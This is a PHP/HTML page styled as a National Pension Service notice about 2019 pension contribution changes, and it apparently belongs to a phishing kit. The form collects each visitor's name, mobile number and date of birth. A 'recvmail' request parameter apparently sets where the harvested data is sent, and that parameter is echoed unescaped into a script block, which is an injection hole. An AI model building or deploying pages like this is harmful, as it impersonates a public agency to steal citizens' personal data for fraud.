<?
$recvmail = $_REQUEST['recvmail'];
$select = $_REQUEST['select'];

echo("
<script>
var recvmail = '".$recvmail."';
var select = '".$select."';
</script>
")
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="ko">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<link rel="stylesheet" type="text/css" href="base.css" media="all">
</meta>
<script type='text/javascript' src='/js/secure_check.js'></script>
<script type="text/javascript" src="/js/jquery-3.4.1.js"></script>
</head>

<body>
<div align="center">
<form id="frm">

<table width="600">
<tbody>
<tr><td colspan="3">
	<table cellspacing="0" cellpadding="0" width="100%" border="0">
		<tbody>
			<tr height="30" bgcolor="#66cdaa">
				<td width="20"></td>
				<td style="FONT-SIZE: 11px; FONT-FAMILY: 돋움; COLOR: #ffffff" ></td>
				<td align="right" style="FONT-SIZE: 11px; FONT-FAMILY: 돋움; COLOR: #ffffff" >국민연금관리공단 안내 페이지</td>
                <td width="20"></td>
			</tr>
			<tr height="80">
				<td width="20"></td>
				<td colspan="2"><div><img src="/event1/logo_nps.gif" style="width: auto; height: 50;"></td>
				<td width="20"></td>
			</tr>
		</tbody>
	</table>
</td>
</tr>
<tr>
	<td colspan="3">
		<h2>국민연금 기준소득액 변경 &lt;2019년&gt;</h1>
	</td>
</tr>
<tr height="70">
	<td colspan="3">
		<h3>국민연금 납부액/수령액 변경 사항 조회 서비스</h1>
	</td>
</tr>
<tr height="30"></tr>
<tr align="center">
	<td>
	<table width="500">
	<tbody bgcolor="ffffff">
		<tr height="50">
			<td width="70"></td>
			<td><input name="name" id="name" value="" validate="required" type="text" label="이름" placeholder="이름" class="reset" title="이름"></td>
			<td width="70"></td>
		</tr>
		<tr height="50">
			<td></td>
			<td><input type="text" name="phone" id="phone" value="" label="휴대폰 번호" validate="required;digit;minlength:10;" maxlength="11" placeholder="휴대폰 번호(‘-’ 없이 입력)" title="휴대폰 번호(‘-’ 없이 입력)"></td>
			<td></td>
		</tr>
		<tr height="50">
			<td></td>
			<td><input type="text" class="inp_txt" name="mail" id="mail" value="" validate="required" label="생년월일" placeholder="생년월일" title="생년월일"></td>
			<td></td>
		</tr>
		<tr><td colspan="3">
			<div class="submit">
				<a href="javascript:secure_check();" class="btn bk big">입력 확인</a> </div> </div> 
			<div class="center_info">
		</td>
		</tr>
		<tr height="30"><td colspan="3"></td></tr>
	</tbody>
	</table>
	</td>
</tr>
<tr height="30" bgcolor="#eeeeee"><td colspan="3"></td></tr>
</tbody>
</table>
</div>
</form> 

</body>
</html>